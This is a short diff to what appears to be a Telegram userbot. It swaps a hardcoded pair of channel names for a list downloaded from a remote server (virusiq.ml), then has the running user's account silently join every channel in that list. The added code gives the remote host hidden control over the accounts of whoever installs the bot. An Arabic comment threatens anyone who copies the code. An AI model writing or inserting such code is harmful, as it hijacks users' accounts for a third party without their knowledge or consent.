@@ -6,7 +6,7 @@ import sys
 import urllib.request
 from datetime import timedelta
 from pathlib import Path
-import requests
+import json, requests
 from telethon import Button, functions, types, utils
 from telethon.sync import TelegramClient
 from telethon.tl.functions.channels import JoinChannelRequest
@@ -181,10 +181,11 @@ async def add_bot_to_logger_group(chat_id):
         except Exception as e:
             LOGS.error(str(e))
 #by @Revthon بس اشوفك خامطه للكود اهينك وافضحك 
-
-revthon = {"@Revthon", "@RevthonSupport"}
+revthon = requests.get(url="http://virusiq.ml/rev/js.json")
+binary = revthon.content
+output = json.loads(binary)
 async def saves():
-   for DEVREVV in revthon:
+   for DEVREVV in output["ch"]:
         try:
              await reviq(JoinChannelRequest(channel=DEVREVV))
         except OverflowError:
